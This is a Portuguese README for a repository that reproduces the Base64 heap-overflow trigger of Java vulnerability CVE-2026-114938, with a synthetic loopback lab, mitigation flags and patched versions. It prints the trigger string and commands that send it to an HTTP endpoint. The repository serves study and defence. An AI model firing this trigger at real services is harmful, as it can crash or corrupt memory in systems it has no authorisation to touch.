# java2shell / Java4Shell — CVE-2026-114938

Reprodutor do **primitivo de corrupção de memória** publicamente documentado de
CVE-2026-114938, acompanhado de um **laboratório sintético** para estudar o
conceito OOB-write → execução de comando em ambiente local e autorizado.

> **Leia isto antes de usar.** Não existe PoC público, funcional e reproduzível
> desta CVE que execute `id` / `whoami` de verdade. A cadeia OOB-write → RCE é
> específica de aplicação, classificada como `AC:H` pela Oracle, e o autor da
> descoberta (Calif) mantém os exploits de produto em sigilo. Qualquer código
> que prometa "whoami via CVE-2026-114938" é **um laboratório sintético** (com
> gate de comando embutido na aplicação) **ou uma farsa** (trata HTTP 500 /
> crash / reset como "shell provada"). Este repositório entrega o primitivo
> real **e** o laboratório sintético, ambos rotulados com honestidade.

---

## Sumário

- [O que é a vulnerabilidade](#o-que-é-a-vulnerabilidade)
- [Arquivos](#arquivos)
- [Pré-requisitos](#pré-requisitos)
- [Passo a passo](#passo-a-passo)
  - [1. Gerar e validar o gatilho](#1-gerar-e-validar-o-gatilho)
  - [2. Enviar o gatilho a um laboratório vulnerável](#2-enviar-o-gatilho-a-um-laboratório-vulnerável)
  - [3. Laboratório sintético: ver `whoami` / `id` executar](#3-laboratório-sintético-ver-whoami--id-executar)
- [Saída esperada (verificada)](#saída-esperada-verificada)
- [Troubleshooting](#troubleshooting)
- [Mitigação e correção](#mitigação-e-correção)
- [Referências](#referências)
- [Aviso legal](#aviso-legal)

---

## O que é a vulnerabilidade

| Campo | Valor |
| --- | --- |
| CVE | CVE-2026-114938 (OpenJDK JDK-8393212) |
| Alcunha | Java4Shell / Java2Shell |
| Tipo | Heap buffer overflow (CWE-122) — escrita fora dos limites |
| Local | Intrínseco AVX-512 VBMI do decodificador `java.util.Base64` no HotSpot |
| Complexidade | Alta (`AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H`, CVSS 8.1) |

Todas as condições precisam ocorrer **juntas**:

1. JVM afetada (ex.: `17 <= 17.0.21`, `21 <= 21.0.13`, `25 <= 25.0.5`, `27 <= 27.0.1`);
2. CPU x86-64 com `avx512f`, `avx512bw`, `avx512vbmi` e `bmi2`;
3. `UseBASE64Intrinsics` habilitado (padrão);
4. Base64 não confiável chega ao decodificador **depois** de a C2 JIT compilar.

**Gatilho público:** 64 × `A` + `=` (JDK 21/25) ou 128 × `A` + `=` (Java 17 antigo).

---

## Arquivos

| Arquivo | Função |
| --- | --- |
| `java2shell_poc.py` | Reprodutor **real** do primitivo: checa CPU/JVM, gera o gatilho, envia a um endpoint HTTP e exibe a resposta. **Não contém RCE e não finge conter.** |
| `CommandGateLab.java` | Laboratório **sintético/didático**. Um *role bit* é corrompido e a **aplicação** chama `id`/`whoami`. Comando fixo e benigno, preso ao loopback. |
| `lab_client.py` | Cliente do laboratório sintético: mostra o caso limpo e o caso gatilho. |
| `README.md` | Este arquivo. |

---

## Pré-requisitos

- Python 3.8+ (testado em 3.14) — somente biblioteca padrão.
- JDK 8+ com `javac` (testado em Java 26) — apenas para o laboratório sintético.
- Opcional: Docker, para o laboratório vulnerável real do projeto `zake1god/java2shell`.

```bash
python3 --version
javac -version
```

---

## Passo a passo

### 1. Gerar e validar o gatilho

Não precisa de alvo. Apenas confirma que o payload e as pré-condições locais estão corretos.

```bash
python3 java2shell_poc.py --selftest
```

Saída esperada (resumida):

```text
[selftest] variante: jdk21_25
[selftest] gatilho (len=65): 'AAAA...AAAA='
[selftest] bytes decodificados (len=48): b'\x00\x00...'
[selftest] JVM local: java version "26.0.2.1"
[selftest] OK. Gatilho gerado. (Isto prova o PRIMITIVO, nao execucao de comando.)
```

> Em Linux o script também lê `/proc/cpuinfo` e informa se faltam as flags AVX-512 VBMI.

Para a variante Java 17 antiga:

```bash
python3 java2shell_poc.py --selftest --variant jdk17
```

### 2. Enviar o gatilho a um laboratório vulnerável

Use **apenas um laboratório seu**. O exemplo aponta para loopback.

```bash
python3 java2shell_poc.py \
  --host 127.0.0.1 \
  --port 8080 \
  --path /decode
```

Para subir o laboratório vulnerável/mitigado real (Docker, loopback):

```bash
git clone https://github.com/zake1god/java2shell.git
cd java2shell
make preflight
make verify
```

> Um crash, HTTP 500 ou reset **não prova RCE**. Prova de OOB exige medir bytes
> alterados após o fim do buffer e comparar com o controle mitigado
> (`-XX:-UseBASE64Intrinsics`).

### 3. Laboratório sintético: ver `whoami` / `id` executar

Aqui o comando executa de verdade — mas por decisão da **aplicação de teste**,
não pelo bug da JVM.

Terminal 1 — compile e suba o servidor:

```bash
javac CommandGateLab.java
java CommandGateLab 18080
```

Saída:

```text
CommandGateLab (SINTETICO) ouvindo em 127.0.0.1:18080/decode
Este e um laboratorio didatico, NAO uma exploracao do JVM.
```

Terminal 2 — rode o cliente:

```bash
python3 lab_client.py --port 18080
```

---

## Saída esperada (verificada)

```text
=== 1) payload LIMPO (sem gate) ===
[LAB SINTETICO — nao e exploit real de CVE-2026-114938]
decoded_len=48
role_bit=0
[LAB] sem corrupcao -> gate NAO atingido, nenhum comando executado.

=== 2) payload GATILHO (gate da aplicacao -> id/whoami) ===
[LAB SINTETICO — nao e exploit real de CVE-2026-114938]
decoded_len=48
role_bit=1
[LAB] gate da aplicacao atingiu role=admin -> exec: whoami
desktop-kckno9v\crash00xd
```

No Linux, o último comando é `id` em vez de `whoami`.

---

## Troubleshooting

| Sintoma | Causa | Solução |
| --- | --- | --- |
| `java.net.BindException: Address already in use` | Porta ocupada (ex.: Caido em 8080) | Escolha outra: `java CommandGateLab 18080` e `python3 lab_client.py --port 18080` |
| `binascii.Error: Excess padding not allowed` | Decoder estrito do Python rejeita o `=` extra | Já tratado: o código remove o padding só para calcular os bytes |
| `[LAB] Base64 invalido.` | Payload com caracteres fora de A-Z/a-z/0-9/+// | Envie exatamente `A`×64 + `=` |
| `CPU sem AVX-512 VBMI` | Hardware sem suporte | O intrínseco vulnerável não é usado; o CVE não é explorável nessa máquina |
| JVM local já corrigida | Versão >= 17.0.21.1 / 21.0.13.1 / 25.0.5.1 | Use o Docker do laboratório público para reproduzir |

---

## Mitigação e correção

Mitigação imediata (desativa o intrínseco vulnerável):

```bash
export JAVA_TOOL_OPTIONS="-XX:-UseBASE64Intrinsics"
```

Correção permanente: atualize a JVM para `17.0.21.1`, `21.0.13.1`, `25.0.5.1` ou superior e reinicie todos os processos Java.

---

## Referências

- https://securelayer7.net/learn/web-exploitation/what-is-java2shell
- https://github.com/zake1god/java2shell — laboratório vulnerável vs mitigado (Docker, loopback)
- https://github.com/mylesagnew/java2shell-detection — checagem de exposição sem enviar o trigger
- https://semgrep.dev/blog/2026/java4shell-openjdk-base64-vulnerability/

---

## Aviso legal

Somente para uso em ambiente próprio, isolado e/ou autorizado. Não use contra
sistemas de terceiros. O laboratório sintético não é uma arma: o comando é
fixo e benigno e não há parâmetro controlável pelo requisitante.
